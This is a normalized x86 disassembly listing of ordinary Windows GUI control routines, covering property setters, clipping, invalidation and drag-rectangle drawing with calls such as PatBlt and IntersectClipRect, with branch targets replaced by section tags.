mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x8a ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8a ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_42cc88
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb00d
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_42ccc4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4a ]
xor al 0x1
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42cce0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4a ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4a ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_42cd20
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x50 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x50 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_42cd60
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x68 ]
cmp ax [ ebp - 0x6 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov ax [ ebp - 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] ax
push 0x0
xor ecx ecx
mov edx 0xb00f
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_42cdb8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42cd9c
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_4291dc
mov eax [ ebp - 0x4 ]
call sub_4291dc
jmp r-xdata
sub_42cdec
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov bx 0xffd3
call sub_44c24c
pop ebx
pop ecx
pop ebp
retn
sub_42ce08
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x134 ]
mov edx [ ebp - 0x4 ]
call sub_43c504
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x134 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x10 ]
dec eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x134 ]
mov edx [ ebp - 0xc ]
call sub_43c2dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x134 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43c550
mov cl 0x1
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x47 ]
mov eax [ ebp - 0x4 ]
call sub_42d084
mov eax [ ebp - 0x4 ]
call sub_41a7e8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
test [ eax + 0x44 ] 0x4
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov bx 0xffd6
call sub_44c24c
sub_42cedc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42ce08
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x134 ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
call sub_42ce08
jmp r-xdata
sub_42cf20
push ebp
mov ebp esp
add esp 0xffffffe8
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42cfd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SetViewportOrgEx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cfde
lea eax [ ebp - 0x18 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
call sub_44c7a8
sub_42cfe8
push ebp
mov ebp esp
add esp 0xffffffd0
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x134 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43c504
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_43c464
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
jg r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x40 ] 0x40
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x10 ]
call sub_42c198
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x20 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x20 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
sub_42d084
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x16 ] cl
mov [ ebp - 0x15 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42c198
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
test [ eax + 0x40 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_434714
push eax
call InvalidateRect
push ebp
call sub_42cfe8
pop ecx
test al al
je r-xdata
mov al 0x1
sub_42d110
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x40
setne cl
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x47 ]
mov eax [ ebp - 0x4 ]
call sub_42d084
pop ecx
pop ebp
retn
sub_42d134
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ eax ]
call [ edx + 0x80 ]
sub_42d158
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_434714
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42d238
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x3c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_431a00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_434714
push eax
call ReleaseDC
retn
sub_42d26c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4f ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_42d29c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4f ] 0x1
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_42d2cc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4f ]
dec eax
sub al 0x2
jb r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_42d2fc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x8 ]
mov eax [ rw-data ]
mov dl [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_42d320
pop ecx
pop ebp
retn
sub_42d320
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42df74
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x44 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
cmp [ ebp - 0xc ] 0x0
jge r-xdata
lea eax [ ebp - 0x14 ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42c3e4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x14 ]
call sub_444558
push eax
xor ecx ecx
mov edx 0x202
mov eax [ ebp - 0x4 ]
call sub_42df28
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_42a718
sub_42d420
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_42d478
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_42d4bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_42d4f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_42d534
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x38 ]
call sub_42c94c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x38 ]
call sub_42c918
mov [ ebp - 0x10 ] eax
fild [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
fmul [ eax + 0x20 ]
mov eax [ ebp - 0x8 ]
fild [ eax + 0xc ]
fsubrp st1
fstp [ ebp - 0x18 ]
fwait
fild [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
fmul [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
fild [ eax + 0x10 ]
fsubrp st1
fstp [ ebp - 0x20 ]
fwait
mov eax [ ebp - 0x8 ]
add eax 0x44
mov [ ebp - 0x24 ] eax
fld [ ebp - 0x18 ]
call sub_44bc28
mov edx [ ebp - 0x24 ]
mov [ edx ] eax
fld [ ebp - 0x20 ]
call sub_44bc28
mov edx [ ebp - 0x24 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax ]
add eax [ ebp - 0xc ]
mov edx [ ebp - 0x24 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x4 ]
add eax [ ebp - 0x10 ]
mov edx [ ebp - 0x24 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x17c ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
call GetWindowRect
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x148 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x54 ]
push eax
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x148 ]
mov edx [ ebp - 0x8 ]
mov ecx [ edx + 0x58 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_42d65c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffd7
call sub_44c24c
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42d684
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_42d6c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_42d6fc
push ebp
mov ebp esp
add esp 0xffffffd4
push esi
push edi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x2c ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x5c ]
lea edi [ ebp - 0x2c ]
mov ecx 0x4
[ edi ] [ esi ]
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x10 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call GetDCEx
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42d845
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
call sub_40f3c0
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push r--data
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call PatBlt
push r--data
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call PatBlt
push r--data
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call PatBlt
push r--data
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call PatBlt
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d84c
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call ReleaseDC
retn
sub_42d854
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffea
call sub_44c24c
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42d878
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffea
call sub_44c24c
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42d89c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_44c1e8
mov [ ebp - 0xe ] al
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42c3e4
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x4 ]
sub al 0x3
jb r-xdata
cmp [ ebp - 0xe ] 0x0
jne r-xdata
mov [ ebp - 0xd ] 0x1
cmp [ ebp - 0xe ] 0x0
je r-xdata
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_44c200
mov eax [ eax + 0x38 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x4 ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov bx 0xffe3
call sub_44c24c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x4 ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xc ]
mov bx 0xffcb
call sub_44c24c
jmp r-xdata
cmp [ ebp - 0xe ] 0x0
je r-xdata
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov al [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov bx 0xffd0
call sub_44c24c
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xc ]
mov bx 0xffbb
call sub_44c24c
jmp r-xdata
sub_42d9ac
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b77c
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42df74
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
